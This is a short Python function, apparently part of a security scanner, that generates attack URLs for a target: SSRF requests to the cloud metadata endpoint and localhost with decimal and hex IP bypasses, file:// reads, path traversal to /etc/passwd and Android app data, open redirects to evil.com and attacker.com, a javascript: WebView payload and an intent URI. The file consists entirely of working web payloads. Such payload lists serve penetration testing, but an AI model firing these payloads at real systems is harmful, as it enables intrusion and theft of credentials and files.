def generate_ai_payloads(target_uri):
    """
    توليد Payloads لاختبار:
    - SSRF
    - Path Traversal
    - Open Redirect
    """

    base = target_uri.rstrip("/")

    payloads = [

        # 🔥 SSRF
        f"{base}?url=http://169.254.169.254/latest/meta-data/",
        f"{base}?url=http://127.0.0.1:80",
        f"{base}?url=http://localhost:8080",
        f"{base}?url=http://10.0.2.2:80",

        # 🔥 SSRF bypass
        f"{base}?url=http://2130706433",   # 127.0.0.1 decimal
        f"{base}?url=http://0x7f000001",   # hex bypass

        # 🔥 File access
        f"{base}?file=file:///etc/hosts",
        f"{base}?path=file:///data/data/",

        # 🔥 Path traversal
        f"{base}?path=../../../../../../etc/passwd",
        f"{base}?path=../../../../data/data/com.example/shared_prefs/",

        # 🔥 Open redirect
        f"{base}?redirect=http://evil.com",
        f"{base}?next=https://attacker.com",

        # 🔥 WebView abuse
        f"{base}?url=javascript:alert(1)",

        # 🔥 Intent abuse
        f"intent://scan/#Intent;scheme={base};package=com.android.chrome;end"
    ]

    # remove duplicates
    return list(set(payloads))
